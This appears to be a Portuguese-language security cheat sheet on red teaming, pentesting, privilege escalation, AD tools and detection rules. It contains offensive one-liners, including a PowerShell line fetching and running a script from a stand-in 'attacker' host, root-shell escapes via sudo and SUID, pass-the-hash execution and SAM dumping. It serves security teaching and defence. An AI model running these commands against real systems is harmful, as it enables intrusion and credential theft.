🔴 Red Team

Simular adversários reais em operações estruturadas de teste de segurança.

O que é

Red Team é uma simulação realista de um ataque APT, testando não apenas defesa técnica, mas também processos, pessoas e procedimentos.

Fases do Red Team

1. Reconhecimento (OSINT passivo) 2. Weaponização (criar payloads) 3. Entrega (phishing, watering hole) 4. Exploração (explorar vulnerabilidade) 5. Instalação (persistência) 6. C2 (Command & Control) 7. Ações nos Objetivos (lateral movement, data exfil)

Ferramentas principais

nmap -sS -p- target.com subfinder -d target.com BloodHound (AD mapping) Burp Suite (web testing) Metasploit (exploitation) HAVOC C2 (command & control)
💡 Dica: Red Teams focam em OPSEC, evasão e persistência — não é apenas exploração rápida, é operação realista.

🔍 Pentest

Teste de penetração estruturado para identificar vulnerabilidades em sistemas, aplicações e infraestrutura.

Diferença: Pentest vs Red Team

  • Pentest: Encontrar vulnerabilidades
  • Red Team: Simular adversário real

Fases do Pentest

1. Reconhecimento 2. Scanning (vulnerabilidades) 3. Enumeração 4. Exploração 5. Pós-exploração 6. Relatório

Ferramentas por fase

  • Scanning: Nmap, Nessus, OpenVAS
  • Web: Burp Suite, OWASP ZAP
  • Exploitation: Metasploit, Impacket
  • Reporting: Burp, Nessus, Dradis

🪟 Privilege Escalation — Windows

Técnicas para elevar privilégios de usuário comum para administrador/SYSTEM.

Verificar privilégios atuais

whoami /all whoami /priv Get-Identity

Técnicas comuns

1. UAC Bypass

C:\Windows\System32\fodhelper.exe reg add HKCU\Software\Classes\ms-settings\shell\open\command

2. Service Vulnerability

accesschk64.exe -accepteula -nobanner /w "Authenticated Users" c:\ sc query state=all | findstr /i "SERVICE_NAME"

3. Kernel Exploit

systeminfo > info.txt python wes.py info.txt
⚠️ Detecção: Monitore changes em services, registry UAC, DLL injection.

🐧 Privilege Escalation — Linux

Técnicas para elevar privilégios de usuário comum para root em Linux.

Verificar privilégios atuais

id sudo -l groups

Técnicas comuns

1. Sudo Misconfiguration

sudo -l sudo -u root /usr/bin/python -c "import os; os.system('/bin/bash')"

2. SUID Binary Abuse

find / -perm -4000 2>/dev/null /usr/bin/find . -exec /bin/bash \; -quit

3. Kernel Exploit

uname -a gcc exploit.c -o exploit ./exploit
⚠️ Detecção: Monitore sudo execution, SUID binary access, kernel exploits.

👻 EDR Evasion

Técnicas para contornar Endpoint Detection and Response (EDR).

Tipos de detecção EDR

  • Assinatura: Pattern matching conhecido
  • Heurística: Análise comportamental estática

🔵 Burp Suite

Proxy web e scanner de vulnerabilidades líder em testes de aplicações web.

Funcionalidades principais

  • Proxy: Interceptar/modificar requests
  • Scanner: Scan automático
  • Intruder: Fuzzing e brute-force
  • Repeater: Testar requests customizadas

Workflow básico

1. Configurar proxy (127.0.0.1:8080) 2. Target → Scope → Add target URL 3. Navegar no browser 4. Scanner → Active/Passive Scan 5. Issues → Revisar vulnerabilidades
💡 Dica: Use "Scope" para focar apenas em URLs alvo, reduz falsos positivos.

🩸 BloodHound

Visualiza relacionamentos e caminhos de ataque em Active Directory.

O que faz

BloodHound mapeia usuários, grupos, computadores e relações de permissão em AD.

Instalação & Coleta

.\SharpHound.exe -c All python3 bloodhound.py -d domain.com -u user -p pass -c All

Análise de dados

1. Abrir BloodHound (Neo4j backend) 2. Upload .zip coletado 3. Home → Queries pré-prontas 4. Find Shortest Path to DA

Técnicas encontradas

  • Constrained Delegation
  • Unconstrained Delegation
  • Kerberoasting opportunities
  • GenericWrite/GenericAll permissions

🌐 NXC (NetExec)

Ferramenta moderna para testes de segurança em redes SMB/LDAP/Kerberos.

Funcionalidades

  • Descoberta de hosts
  • Validação de credenciais
  • Execução remota de comandos
  • Pass-the-Hash / Pass-the-Ticket
  • Dumping de hashes

Uso básico

# Descobrir hosts vivos nxc smb 192.168.1.0/24 # Validar credenciais nxc smb 192.168.1.100 -u user -p pass # Pass-the-Hash nxc smb 192.168.1.100 -u admin -H "hash" -x "whoami" # Dump de SAM nxc smb 192.168.1.100 -u admin -p pass --sam

🎯 Nmap

Scanner de portas e detecção de serviços - ferramenta essencial de reconhecimento.

Scans comuns

# Quick scan (top 1000 portas) nmap -F target.com # Scan completo nmap -sS -Pn -p- target.com # Detalhado (versão + scripts) nmap -sV -sC -p- target.com # Agressivo nmap -A -p- target.com

🪟 Windows — Ofensivo & Defensivo

Técnicas maliciosas em Windows e como detectá-las.

Técnicas ofensivas comuns

Execução de código

# PowerShell powershell.exe -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')" # CMD cmd.exe /c "for /l %i in (1,1,3) do @ping 127.0.0.1" # WMI wmic process call create "cmd.exe /c beacon.exe"

  • wmic.exe (suspeito)

  • Process injection (VirtualAllocEx + WriteProcessMemory)
⚠️ EDR Monitoring: Unauthorized process creation, registry modification, DLL injection, LSASS access.

🎯 MITRE ATT&CK

Framework que documenta técnicas de adversários conhecidas e comprovadas.

O que é

MITRE ATT&CK é uma base de conhecimento curada com técnicas, tácticas e procedimentos (TTPs) usados por adversários reais.

Estrutura

  • Tactics: Objetivo do adversário (ex: Initial Access)
  • Techniques: Como executar a tática (ex: T1566 Phishing)
  • Sub-techniques: Variação específica (ex: T1566.001)
  • Procedures: Implementação específica por malware

Tácticas principais

TA0001 - Initial Access TA0002 - Execution TA0003 - Persistence TA0004 - Privilege Escalation TA0005 - Defense Evasion TA0006 - Credential Access TA0008 - Lateral Movement TA0009 - Collection TA0010 - Exfiltration

https://attack.mitre.org →

📋 TTPs

Padrão de comportamento de um adversário (Tactics, Techniques, Procedures).

Definições

  • Tactics: Objetivos de alto nível
  • Techniques: Como alcançar cada objetivo
  • Procedures: Implementação específica

Exemplo: Operação estruturada

Tactic: Initial Access Technique: Spearphishing Procedure: Email malicioso com anexo Tactic: Execution Technique: User Execution Procedure: Vítima abre anexo Tactic: Privilege Escalation Technique: Kernel Exploit Procedure: CVE-2009-2846 (Windows)
💡 Prioridade defensiva: TTPs comuns (Phishing, Pass-the-Hash) devem ter detecção específica.

🔴 Threat Detection

Capacidade de identificar atividades maliciosas em tempo real.

Tipos de detecção

  • Signature-based: Pattern matching
  • Anomaly-based: Desvio do normal
  • Behavioral: Análise de cadeia de atividades

Sigma rules (genéricas)

title: PowerShell execution from temp logsource: product: windows category: process_creation detection: selection: Image|endswith: 'powershell.exe' CommandLine|contains: - 'Temp' - 'Downloads' condition: selection

YARA rules (malware)

rule MalwareExample { strings: $s1 = "cmd.exe /c" wide $hex = { 4D 5A 90 00 } condition: all of them }

⚙️ Detection Rule Tuning

Otimizar regras de detecção para maximizar efetividade e minimizar falsos positivos.

Estratégia de tuning

1. Whitelisting

Adicionar processos legítimos que trigam falsos positivos.

2. Correlação

Combinar múltiplos indicadores ao invés de alertar em um único evento.

3. Contextualização

  • Horário (behavior anormal fora de horas?)
  • Usuário (admin ou comum?)
  • Localização (IP corporativo?)
  • Histórico (foi detectado antes?)

Métrica: TP vs FP

Precision = TP / (TP + FP) Recall = TP / (TP + FN) F-score = 2 * (Precision * Recall) / (Precision + Recall)
💡 Regra 80/20: 20% das regras capturam 80% dos verdadeiros ataques.
